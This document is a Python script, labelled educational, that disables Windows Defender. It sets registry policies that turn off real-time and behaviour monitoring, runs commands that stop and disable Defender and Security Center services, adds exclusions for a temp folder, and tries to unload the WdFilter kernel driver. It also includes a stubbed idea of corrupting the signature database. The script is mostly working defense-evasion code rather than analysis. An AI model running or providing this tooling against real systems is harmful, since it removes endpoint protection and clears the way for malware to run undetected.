#!/usr/bin/env python3
"""
Windows Defender Tampering
Disables Windows Defender components
Educational/Research purposes only
"""
import ctypes
import subprocess
import winreg
import json
import os

class DefenderTamper:
    def __init__(self):
        self.defender_paths = {
            'mpcmdrun': 'C:\\Program Files\\Windows Defender\\MpCmdRun.exe',
            'mpconfig': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
        }
    
    def disable_realtime_monitoring(self):
        """
        Disables real-time protection via registry
        Requires SYSTEM or TrustedInstaller typically
        """
        try:
            # HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection
            key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
            
            with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                # Disable real-time monitoring
                winreg.SetValueEx(key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
                winreg.SetValueEx(key, "DisableIOAVProtection", 0, winreg.REG_DWORD, 1)
                winreg.SetValueEx(key, "DisableBehaviorMonitoring", 0, winreg.REG_DWORD, 1)
                
            print("[+] Real-time protection disabled via policy")
            return True
            
        except PermissionError:
            print("[-] Insufficient privileges (need SYSTEM/Admin)")
            return False
    
    def disable_via_psexec(self):
        """
        Uses PsExec to run as SYSTEM and disable
        """
        commands = [
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
            'net stop WinDefend',
            'sc config WinDefend start= disabled'
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, capture_output=True)
            except:
                pass
    
    def add_exclusion(self, path):
        """
        Add path to Defender exclusions
        """
        try:
            # Via PowerShell
            ps_cmd = f'Add-MpPreference -ExclusionPath "{path}"'
            subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True)
            
            # Also add exclusion for processes
            ps_cmd = f'Add-MpPreference -ExclusionProcess "{os.path.basename(path)}"'
            subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True)
            
            return True
        except:
            return False
    
    def disable_services(self):
        """
        Stop and disable Defender services
        """
        services = [
            "WinDefend",           # Antimalware Service
            "SecurityHealthService", # Security Center
            "wscsvc"               # Security Center service
        ]
        
        for svc in services:
            try:
                # Stop service
                subprocess.run(f"net stop {svc}", shell=True, capture_output=True)
                # Disable startup
                subprocess.run(f"sc config {svc} start= disabled", shell=True, capture_output=True)
            except:
                pass
    
    def modify_defender_config(self):
        """
        Modify Defender configuration files if accessible
        """
        config_paths = [
            'C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\mpenginedb.db',
            'C:\\ProgramData\\Microsoft\\Windows Defender\\Configuration\\'
        ]
        
        # Corrupt signature database, etc.
        pass
    
    def unload_defender_driver(self):
        """
        Attempt to unload WdFilter.sys (kernel driver)
        Requires elevated privileges
        """
        # fltmc unload WdFilter
        try:
            subprocess.run(["fltmc", "unload", "WdFilter"], capture_output=True)
        except:
            pass

class TamperRestore:
    """Restore Defender settings (for cleanup)"""
    
    def restore(self):
        """Re-enable all protections"""
        commands = [
            'reg delete "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /f',
            'reg delete "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /f',
            'sc config WinDefend start= auto',
            'net start WinDefend'
        ]
        
        for cmd in commands:
            subprocess.run(cmd, shell=True, capture_output=True)

if __name__ == "__main__":
    dt = DefenderTamper()
    dt.disable_realtime_monitoring()
    dt.add_exclusion("C:\\\\Windows\\\\Temp")